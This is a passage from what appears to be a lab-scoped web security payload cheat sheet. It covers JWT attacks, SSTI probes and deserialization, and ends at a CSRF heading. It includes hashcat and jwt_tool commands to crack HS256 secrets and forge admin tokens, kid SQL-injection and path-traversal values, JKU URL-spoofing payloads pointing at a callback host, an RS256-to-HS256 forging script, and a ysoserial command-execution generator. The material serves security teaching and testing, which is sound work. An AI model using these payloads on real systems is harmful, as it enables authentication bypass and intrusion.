<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the deliberately vulnerable validator accepts an unsigned synthetic token; the fixed validator rejects it because the algorithm allowlist requires a signature; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S4,S5,S6 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python jwt_tool.py <JWT_TOKEN> -X a
    ```


---

### 8.2. Weak Secret Exploitation (HS256)
*   **Identification / Signs**:
    *   *Notes*: Token is signed using the symmetric HS256 algorithm and the secret key is set simply.
    *   *English rewrite*: Token header specifies HS256 algorithm and relies on common passwords as signing secret.
*   **Suspicion / Testing**:
    *   *Notes*: Extract the signature and use a list of common keywords to brute-force the HS256 secret offline.
    *   *English rewrite*: Extract JWT token string and perform offline wordlist brute-forcing against HS256 secret.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-08-003 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.2. Weak Secret Exploitation (HS256) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the bounded lab wordlist recovers only the intentionally weak HS256 fixture secret; a generated high-entropy key is not searched or exposed; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S4,S5,S6 -->
<!-- last-verified: 2026-07-17 -->
```bash
    # 1. Save JWT token to file for hashcat cracking (mode 16500 = JWT/JWS)
    echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' > jwt_hash.txt

    # 2. Crack JWT secret using hashcat GPU brute-force (rockyou wordlist)
    hashcat -a 0 -m 16500 jwt_hash.txt rockyou.txt

    # 3. Crack JWT secret using hashcat with common passwords wordlist
    hashcat -a 0 -m 16500 jwt_hash.txt /usr/share/wordlists/fasttrack.txt

    # 4. Crack JWT secret using hashcat with mask (brute-force short secrets)
    hashcat -a 3 -m 16500 jwt_hash.txt '?a?a?a?a?a?a'

    # 5. jwt_tool offline dictionary attack (scans all common weak secrets)
    python jwt_tool.py <JWT_TOKEN> -C -d rockyou.txt

    # 6. jwt_tool crack with a known common weak secrets list
    python jwt_tool.py <JWT_TOKEN> -C -d /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

    # 7. Forge/re-sign JWT with cracked secret, escalate role to admin
    python jwt_tool.py <JWT_TOKEN> -S hs256 -k <CRACKED_SECRET> -I -pc sub -pv admin

    # 8. Forge JWT with cracked secret, set is_admin=true
    python jwt_tool.py <JWT_TOKEN> -S hs256 -k <CRACKED_SECRET> -I -pc is_admin -pv true

    # 9. Python PyJWT script to verify a guessed secret offline
    python -c "import jwt; print(jwt.decode('<JWT_TOKEN>', 'secret', algorithms=['HS256']))"

    # 10. Python loop to brute-force common weak HS256 secrets manually
    python -c "
import jwt, sys
weakkeys = ['secret','admin','password','123456','jwt','key','development','test','system','letmein']
for k in weakkeys:
    try:
        payload = jwt.decode('<JWT_TOKEN>', k, algorithms=['HS256'])
        print('Cracked! Secret:', k, 'Payload:', payload); break
    except: pass
"
```
*   **Automatic Tool**:
    *   *Notes*: Use hashcat to crack JWT signatures very quickly with GPU.
    *   *English rewrite*: Run hashcat to brute force weak HS256 keys from JWT files.<!-- payload-id: CHEAT-08-004 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.2. Weak Secret Exploitation (HS256) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the bounded lab wordlist recovers only the intentionally weak HS256 fixture secret; a generated high-entropy key is not searched or exposed; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S4,S5,S6 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    hashcat -a 0 -m 16500 jwt_hash.txt rockyou.txt
    ```


---

### 8.3. kid Injection
*   **Recognition / Signs**:
    *   *Notes*: The header part of JWT contains the parameter `"kid"` (Key ID) used to specify the decryption key in the database or file system.
    *   *English rewrite*: JWT token header contains `kid` parameter pointing to public keys or databases.
*   **Suspicion / Check**:
    *   *Notes*: Insert Path Traversal characters (to load the empty file `/dev/null`) or SQL Injection into the `"kid"` attribute.
    *   *English rewrite*: Inject directory traversal sequences or SQL clauses into the `kid` property.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-08-005 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.3. kid Injection -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable key resolver reaches only the synthetic key-path marker; the fixed resolver maps an opaque kid to a server-controlled key and rejects path/SQL syntax -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S4,S5,S6 -->
<!-- last-verified: 2026-07-17 -->
```
{"alg":"HS256","kid":"../../../../tmp/sechub-lab/empty-key.pem"} # Synthetic key-path traversal probe
{"alg":"HS256","kid":"/tmp/sechub-lab/empty-key.pem"} # Absolute synthetic key-path probe
{"alg":"HS256","kid":"1' UNION SELECT 'lab-key'-- -"} # SQLi in kid resolver returns only the synthetic lab key
{"alg":"HS256","kid":"' UNION SELECT CHAR(108,97,98,45,107,101,121)--"} # SQLi bypass using CHAR representation for lab-key
{"alg":"HS256","kid":"1' OR 1=1--"}                  # Basic SQLi bypass query
{"alg":"HS256","kid":"../../../../tmp/sechub-lab/key.txt"} # Synthetic key-path traversal probe
{"alg":"HS256","kid":"..\\..\\..\\..\\sechub-lab\\empty-key.pem"} # Windows synthetic key-path traversal probe
{"alg":"HS256","kid":"c:\\sechub-lab\\key.txt"}      # Windows synthetic key-path traversal probe
{"alg":"HS256","kid":"%2e%2e%2f%2e%2e%2ftmp%2fsechub-lab%2fempty-key.pem"} # URL encoded synthetic key-path traversal probe
{"alg":"HS256","kid":"../../../../tmp/sechub-lab/key.txt%00"} # Legacy-only null-byte case; reject on current fixtures
```
*   **Automatic Tool**:
    *   *Notes*: Use jwt_tool with the inject header flag to insert the payload into the kid parameter.
    *   *English rewrite*: Run jwt_tool using the inject header flag to insert the payload into the kid parameter.<!-- payload-id: CHEAT-08-006 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.3. kid Injection -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable key resolver reaches only the synthetic key-path marker; the fixed resolver maps an opaque kid to a server-controlled key and rejects path/SQL syntax; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S4,S5,S6 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "../../../../tmp/sechub-lab/empty-key.pem"
    ```


---

### 8.4. JWK / JKU Injection (JWKS Spoofing)
*   **Identification / Signs**:
    *   *Notes*: Token header contains the attribute `"jwk"` or `"jku"` (JSON Web Key Set URL).
    *   *English rewrite*: Token header specifies `jwk` (JSON Web Key) or `jku` (JSON Web Key Set URL) properties.
*   **Suspicion / Check**:
    *   *Notes*: Change `"jku"` to point to a server you control that contains your self-generated public key and then re-sign the token. The attacker signs the token with the private key and the victim server verifies using the public key fetched from URL JKU.
    *   *English rewrite*: Modify `jku` to point to an attacker-controlled domain hosting a custom JWKS keys file (e.g., `keys.json`). The attacker signs the forged token with their private key, and the server verifies it using the public key fetched from the JKU endpoint.
        Minimal valid JWKS JSON schema (`keys.json`) to host:<!-- payload-id: CHEAT-08-007 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.4. JWK / JKU Injection (JWKS Spoofing) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 JSON without comments; the request/JWK document is parsed exactly once and string escapes are preserved -->
<!-- expected-result: the vulnerable validator accepts only the lab attacker key/JWKS; the fixed validator ignores inline keys and fetches a pinned HTTPS issuer/JWKS identity -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3,S4,S5,S6 -->
<!-- last-verified: 2026-07-17 -->
        ```json
        {
          "keys": [
            {
              "kty": "RSA",
              "use": "sig",
              "kid": "key1",
              "alg": "RS256",
              "n": "modulus-value-here",
              "e": "AQAB"
            }
          ]
        }
        ```
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-08-008 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.4. JWK / JKU Injection (JWKS Spoofing) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable validator accepts only the lab attacker key/JWKS; the fixed validator ignores inline keys and fetches a pinned HTTPS issuer/JWKS identity -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3,S4,S5,S6 -->
<!-- last-verified: 2026-07-17 -->
```
{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","n":"attacker-modulus..."}} # Attacker public key inline injection
{"alg":"RS256","jku":"http://callback.lab.test/keys.json","kid":"key1"} # Attacker JKU URL endpoint injection
{"alg":"RS256","jku":"https://trusted-domain.com.callback.lab.test/keys.json"} # Open redirect domain bypass test
{"alg":"RS256","jku":"http://127.0.0.1/keys.json"}   # SSRF key retrieval test on local address
{"alg":"RS256","jku":"http://localhost:8080/keys.json"} # SSRF alternative localhost port test
{"alg":"RS256","jku":"https://trusted.lab.test/oauth/../keys.json"} # Path traversal in JKU URL parameter
{"alg":"RS256","jku":"http://callback.lab.test%2f@trusted.lab.test/keys.json"} # Host spoofing bypass test
{"alg":"RS256","jku":"http://callback.lab.test:80#@trusted.lab.test/keys.json"} # Fragment host spoofing bypass
{"alg":"RS256","jku":"http://callback.lab.test/jku.json?trusted.lab.test"} # Query parameter spoofing bypass
{"alg":"RS256","jku":"http://trusted.lab.test@callback.lab.test/keys.json"} # Basic authentication host spoofing
```
*   **Automatic Tool**:
    *   *Notes*: Use jwt_tool to configure fake keys and automatically re-sign JWT.
    *   *English rewrite*: Use jwt_tool with custom keys to automate JWT injection.<!-- payload-id: CHEAT-08-009 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.4. JWK / JKU Injection (JWKS Spoofing) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable validator accepts only the lab attacker key/JWKS; the fixed validator ignores inline keys and fetches a pinned HTTPS issuer/JWKS identity; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3,S4,S5,S6 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python jwt_tool.py <JWT_TOKEN> -j -k attacker_key.pem
    ```

---

### 8.5. Algorithm/key confusion RS256 sang HS256

*   **Identification / Signs**:
    *   *Notes*: The validator accepts both `RS256` and `HS256`, retrieves the key corresponding to `kid` from the same key store, then uses the RSA public key bytes as the HMAC secret when the header is changed to `HS256`.
*   **Suspicion / Check**:
    *   *Notes*: Only test offline with tokens and RSA self-generated keys. A secure version must pin the algorithm according to issuer/key ID and never mix asymmetric keys with HMAC algorithms.

<!-- payload-id: CHEAT-08-010 -->
<!-- context: deliberately vulnerable offline JWT verifier fixture using one synthetic RSA public key for both RS256 verification and HS256 HMAC verification; no network or production tokens -->
<!-- prerequisites: generate disposable lab RSA keys, use a synthetic payload, pin a negative-control verifier that allowlists RS256 only, and delete all token/key artifacts after the run -->
<!-- encoding: UTF-8 Python source; JWT segments use base64url without padding and the HMAC key is the DER-encoded lab public key bytes -->
<!-- expected-result: only the deliberately vulnerable verifier accepts the HS256 token signed with the lab public key bytes; the fixed verifier rejects because kid lab-rsa-key is pinned to RS256 -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S4,S5,S6 -->
<!-- last-verified: 2026-07-18 -->
```python
import base64
import hashlib
import hmac
import json
from pathlib import Path

from cryptography.hazmat.primitives import serialization

def b64url(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")

public_key = serialization.load_pem_public_key(Path("lab_public.pem").read_bytes())
public_der = public_key.public_bytes(
    serialization.Encoding.DER,
    serialization.PublicFormat.SubjectPublicKeyInfo,
)

header = {"alg": "HS256", "kid": "lab-rsa-key", "typ": "JWT"}
payload = {"sub": "lab-user", "role": "lab-admin", "fixture": "rs-to-hs-confusion"}
signing_input = b".".join([
    b64url(json.dumps(header, separators=(",", ":")).encode()),
    b64url(json.dumps(payload, separators=(",", ":")).encode()),
])
signature = hmac.new(public_der, signing_input, hashlib.sha256).digest()
print((signing_input + b"." + b64url(signature)).decode())
```

---

## References

- **[S1]** RFC 8725 — JSON Web Token Best Current Practices. https://www.rfc-editor.org/rfc/rfc8725.html — BCP 225; accessed: 2026-07-18.
- **[S2]** RFC 7515 — JSON Web Signature (JWS). https://www.rfc-editor.org/rfc/rfc7515.html — RFC; accessed: 2026-07-18.
- **[S3]** RFC 7517 — JSON Web Key (JWK). https://www.rfc-editor.org/rfc/rfc7517.html — RFC; accessed: 2026-07-18.
- **[S4]** RFC 7519 — JSON Web Token (JWT). https://www.rfc-editor.org/rfc/rfc7519.html — RFC; accessed: 2026-07-18.
- **[S5]** OWASP WSTG — Testing JSON Web Tokens. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens — current version; accessed: 2026-07-18.
- **[S6]** PortSwigger Web Security Academy — JWT attacks. https://portswigger.net/web-security/jwt — current version; accessed: 2026-07-18.

---

## 9. Server-Side Template Injection (SSTI)

> [!CAUTION]
> Only test authorized local fixture templates. Do not use payloads to open a shell, read secrets, or make network calls.

> **Scope of use:** The probes below only detect whether the expression is evaluated in the pinned engine. Do not use gadget RCE; techniques relying on subclass index/callable/version have been eliminated.

SSTI occurs when data controlled by the actor becomes a template source instead of just rendered data. Getting Started uses a probe of numbers/strings without side effects and compares with literal reflection.

> **Related Lessons:** [SSTI](05-injection/ssti/), [Code Injection](05-injection/code-injection/), [Remote Code Execution](10-exceptional-conditions/remote-code-execution/).

### 9.1. Jinja2 3.1

<!-- payload-id: CHEAT-09-001 -->
<!-- context: Jinja2 3.1 fixture; actor input is passed either to Template(source) or as a value in a fixed template -->
<!-- prerequisites: run one disposable Python 3.12 process; expose no Flask config/secret objects and block process/network/filesystem capabilities -->
<!-- encoding: UTF-8 Jinja template text -->
<!-- expected-result: the vulnerable source-template path renders 49 and SECHUB-JINJA; the fixed value-rendering path displays the expressions literally -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```jinja
{{ 7 * 7 }}
{{ ['SECHUB', 'JINJA'] | join('-') }}
```

### 9.2. Twig 3.10

<!-- payload-id: CHEAT-09-002 -->
<!-- context: Twig 3.10 fixture with no user-defined callable filters; actor input is compared as template source versus a bound variable -->
<!-- prerequisites: run PHP 8.2 in a disposable container; disable filesystem/network access and capture rendered output only -->
<!-- encoding: UTF-8 Twig template text -->
<!-- expected-result: the vulnerable source-template path renders 49 and SECHUB-TWIG; the fixed path renders literal text -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S3 -->
<!-- last-verified: 2026-07-17 -->
```twig
{{ 7 * 7 }}
{{ ['SECHUB', 'TWIG'] | join('-') }}
```

### 9.3. FreeMarker 2.3.33

<!-- payload-id: CHEAT-09-003 -->
<!-- context: FreeMarker 2.3.33 fixture with restricted object wrapper and no Execute utility exposed -->
<!-- prerequisites: run Java 17 in a disposable container; expose only synthetic scalar values and block outbound network -->
<!-- encoding: UTF-8 FreeMarker template text -->
<!-- expected-result: the vulnerable source-template path renders 49 and SECHUB-FREEMARKER; the fixed path renders input as data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S4 -->
<!-- last-verified: 2026-07-17 -->
```ftl
${7 * 7}
${['SECHUB', 'FREEMARKER']?join('-')}
```

### 9.4. Velocity 2.3

<!-- payload-id: CHEAT-09-004 -->
<!-- context: Apache Velocity 2.3 fixture exposing only synthetic scalar/list values; no ClassTool or runtime object -->
<!-- prerequisites: run Java 17 in a disposable container; compare evaluated template source with a fixed-template value binding -->
<!-- encoding: UTF-8 Velocity template text -->
<!-- expected-result: the vulnerable source-template path renders the arithmetic/list marker; the fixed path renders the bytes literally -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S5 -->
<!-- last-verified: 2026-07-17 -->
```velocity
#set($value = 7 * 7)$value
#set($marker = "SECHUB-VELOCITY")$marker
```

## References

- **[S1]** PortSwigger Web Security Academy — Server-side template injection. https://portswigger.net/web-security/server-side-template-injection — current version; accessed: 2026-07-18.
- **[S2]** Jinja Documentation — Template Designer Documentation. https://jinja.palletsprojects.com/en/stable/templates/ — current version; accessed: 2026-07-18.
- **[S3]** Twig Documentation — Templates. https://twig.symfony.com/doc/3.x/templates.html — current version; accessed: 2026-07-18.
- **[S4]** Apache FreeMarker Manual — Template Author's Guide. https://freemarker.apache.org/docs/dgui_template.html — current version; accessed: 2026-07-18.
- **[S5]** Apache Velocity Engine — User Guide. https://velocity.apache.org/engine/2.3/user-guide.html — current version; accessed: 2026-07-18.

---

## 10. Deserialization

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

Deserialization occurs when an application converts serialized data back into an object in memory without validating the object's class, leading to arbitrary code execution (RCE).

> **Related lessons:** [Insecure Deserialization](08-data-integrity-failures/insecure-deserialization/), [Prototype Pollution](08-data-integrity-failures/prototype-pollution/), [Remote Code Execution](10-exceptional-conditions/remote-code-execution/).

### 10.1. Java (ysoserial & Serialization Signatures)
*   **Identification / Signs**:
    *   *Notes*: Data being transmitted starts with the Base64 prefix `rO0AB` or the hex byte string `ac ed 00 05`.
    *   *English rewrite*: Data streams display standard Java serialization magic bytes (hex `ac ed 00 05` or base64 `rO0AB`).
*   **Suspicion / Testing**:
    *   *Notes*: Send the payload file URLDNS to check if the server resolves DNS pointing to your OOB server.
    *   *English rewrite*: Submit a URLDNS serialized object and check for outgoing DNS queries.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-10-001 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.1. Java (ysoserial & Serialization Signatures) -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the pinned vulnerable Java gadget fixture writes one local marker after deserialization; the allowlisted/non-native format rejects the stream -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Java Serialization Magic Bytes in hex representation (Hex bytes: 0xAC 0xED 0x00 0x05)
    \xac\xed\x00\x05

    # 2. Base64 representation of Java Serialization Magic Bytes
    rO0AB

    # 3. URLDNS is allowed only with callback.lab.test mapped to a local mock
    # java -jar ysoserial.jar URLDNS http://callback.lab.test/probe-42

    # 4. Command-execution gadget payloads are not included; use a pinned marker-only fixture object instead.
    # java -jar lab-serializer.jar MarkerOnly "SECHUB-JAVA-MARKER" | base64

    # 5. Reject CommonsCollections gadget classes during allowlist validation.
    # grep -q "CommonsCollections" blocked-classes.txt

    # 6. Confirm the fixture records only a local marker and never starts a process.
    # grep -q "SECHUB-JAVA-MARKER" fixture-output.log

    # 7. Reject CommonsBeanutils gadget classes during allowlist validation.
    # grep -q "CommonsBeanutils" blocked-classes.txt

    # 8. Reject ROME gadget classes during allowlist validation.
    # grep -q "ROME" blocked-classes.txt

    # 9. Reject Jackson polymorphic gadget classes unless explicitly allowlisted.
    # grep -q "Jackson" blocked-classes.txt

    # 10. File-write gadget payloads are not included; validate that the fixed parser rejects unknown classes.
    # grep -q "AspectJWeaver" blocked-classes.txt
```
*   **Automatic Tool**:
    *   *Notes*: Use ysoserial to automatically create RCE Java Serialization payload.
    *   *English rewrite*: Run ysoserial tool to generate custom serialized payload files.<!-- payload-id: CHEAT-10-002 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.1. Java (ysoserial & Serialization Signatures) -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the pinned vulnerable Java gadget fixture writes one local marker after deserialization; the allowlisted/non-native format rejects the stream -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    java -jar ysoserial.jar CommonsCollections6 "id" > cc6.ser
    ```


---

### 10.2. PHP Object Injection
*   **Identification / Signs**:
    *   *Notes*: The transmitted parameter contains an object serialization string of PHP (such as `O:4:"User":2:{...}`).
    *   *English rewrite*: Parameter format exhibits standard PHP serialization strings (e.g. `O:4:"User":...`).
*   **Suspicion / Testing**:
    *   *Notes*: Change the value or data type in the serialized string to trigger magic methods (`__wakeup`, `__destruct`).
    *   *English rewrite*: Tamper with class properties or values to trigger vulnerability logic inside magic methods.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-10-003 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.2. PHP Object Injection -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable PHP fixture invokes only the pinned local gadget marker; the fixed endpoint accepts schema-validated JSON and never calls unserialize on actor data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Serialized User object for a fake local fixture
    O:4:"User":1:{s:8:"username";s:5:"admin";}

    # 2. Safe scalar array used to verify parser framing
    a:2:{i:0;s:5:"alpha";i:1;s:4:"beta";}
```
*   **Automatic Tool**:
    *   *Notes*: Use fuzzing tools or self-written scripts to automatically modify the PHP serialized string.
    *   *English rewrite*: Deploy custom python scripts to dynamically generate corrupted serialized PHP classes.<!-- payload-id: CHEAT-10-004 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.2. PHP Object Injection -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable PHP fixture invokes only the pinned local gadget marker; the fixed endpoint accepts schema-validated JSON and never calls unserialize on actor data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Use a local PHP CLI one-liner to generate a marker-only serialized object
    php -r 'class SechubMarker { public $marker = "SECHUB-PHP"; } echo serialize(new SechubMarker());'
    # The fixed endpoint accepts schema-validated JSON instead of PHP serialized actor data
    printf '%s\n' '{"marker":"SECHUB-PHP"}'
    ```


---

### 10.3. Python Pickle
*   **Identification / Indicators**:
    *   *Notes*: Data stored in Cookie or parameters containing Base64 strings starting with the characters `gASV`.
    *   *English rewrite*: Base64 parameter string decodes to Python Pickle opcode bytes (starts with `gASV`).
*   **Suspicion / Check**:
    *   *Notes*: In the disposable fixture, use the fixed protocol-0 stream that only prints a marker; the safe comparison must reject pickle provided by the actor and use the JSON schema.
    *   *English rewrite*: In the disposable fixture, use the fixed protocol-0 stream that only prints a marker; the safe control rejects actor-supplied pickle and uses a JSON schema.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-10-005 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.3. Python Pickle -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: ASCII representation of a protocol-0 pickle stream; literal backslash-n sequences denote opcode line terminators and must be converted to bytes by the isolated harness -->
<!-- expected-result: the disposable Python fixture emits only the SECHUB marker for the explicit unsafe-load case; the fixed JSON path treats the bytes as data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
```text
    # Protocol-0 probe invoking a harmless stdout marker in a disposable fixture
    cos\nsystem\n(S'printf SECHUB_PICKLE_PROBE'\ntR.
```
*   **Automatic Tool**:
    *   *Notes*: Use a self-written Python script to quickly generate Pickle payloads.
    *   *English rewrite*: Compile dynamic Python Pickle payload builders.<!-- payload-id: CHEAT-10-006 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.3. Python Pickle -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the disposable Python fixture emits only the SECHUB marker for the explicit unsafe-load case; the fixed JSON path treats the bytes as data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python3 -c 'import base64,pickle; print(base64.b64encode(pickle.dumps({"probe":"SECHUB"})).decode())'
    ```

---

## References

- **[S1]** OWASP Deserialization Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html — current version; accessed: 2026-07-18.
- **[S2]** Python 3 Documentation — pickle warning and data stream format. https://docs.python.org/3/library/pickle.html — current version; accessed: 2026-07-18.
- **[S3]** PortSwigger Web Security Academy — Insecure deserialization. https://portswigger.net/web-security/deserialization — current version; accessed: 2026-07-18.

---

## 11. CSRF (Cross-Site Request Forgery)

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

CSRF (Cross-Site Request Forgery) occurs when an application allows sensitive actions to be performed through requests from the victim's browser without verifying the origin of the request (Origin/Token), allowing the attacker to force the victim's browser to send requests unintentionally.

> **Related Lesson:** [CSRF](07-authentication-failures/csrf/), [Lax Security Settings](02-security-misconfiguration/lax-security-settings/), [HTTP Parameter Pollution](05-injection/http-parameter-pollution/).

